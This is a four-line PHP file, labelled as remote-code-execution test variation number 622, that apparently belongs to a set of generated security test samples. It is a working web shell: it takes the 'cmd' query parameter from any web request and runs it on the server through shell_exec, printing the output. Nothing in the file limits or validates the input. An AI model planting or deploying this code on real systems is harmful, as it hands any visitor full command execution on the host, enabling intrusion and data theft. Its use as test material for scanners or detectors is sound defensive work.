<?php
// RCE test variation #622
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>